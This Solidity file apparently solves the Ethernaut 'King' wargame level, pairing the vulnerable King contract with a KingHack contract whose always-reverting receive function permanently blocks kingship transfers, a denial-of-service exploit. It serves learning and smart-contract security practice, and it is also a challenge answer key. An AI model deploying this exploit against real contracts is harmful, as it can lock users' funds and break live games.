// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Ethernaut Level 9: King
 *
 * The contract below represents a very simple game: whoever sends it an amount
 * of ether that is larger than the current prize becomes the new king. On such
 * an event, the overthrown king gets paid the new prize, making a bit of ether
 * in the process! As ponzi as it gets xD
 *
 * Such a fun game. Your goal is to break it.
 *
 * When you submit the instance back to the level, the level is going to reclaim
 * kingship. You will beat the level if you can avoid such a self proclamation.
 */
contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingHack {
    address public owner;
    address payable forceAddress;

    constructor(address _forceAddress) {
        owner = msg.sender;
        forceAddress = payable(_forceAddress);
    }

    function give_money() public payable {
        /*Just money*/
    }

    function to_be_the_king(address payable who) public payable {
        (bool sent, bytes memory data) = who.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        require(false, "I don't need your dirty money");
    }
}
